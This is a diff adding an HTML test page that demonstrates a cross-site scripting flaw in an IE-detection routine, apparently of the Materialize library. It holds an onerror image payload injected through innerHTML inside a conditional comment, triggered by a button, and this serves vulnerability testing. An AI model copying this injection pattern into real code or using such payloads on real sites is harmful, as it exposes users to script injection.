@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test</title>
+    <script src="sqli/static/js/materialize.js"></script>
+</head>
+<body>
+    <script>
+        // The vulnerable code is in the IE detection function
+        // Normally this wouldn't be directly callable, but for testing we can simulate it
+        function testVulnerability() {
+            var r = document;
+            var e = '<img src=x onerror="alert(\'XSS\')">'; // Malicious input
+            var t = r.createElement("div");
+            t.innerHTML = "<!--[if IE " + e + "]><span></span><![endif]-->";
+            document.body.appendChild(t);
+        }
+    </script>
+    <button onclick="testVulnerability()">Test Vulnerability</button>
+</body>
+</html>
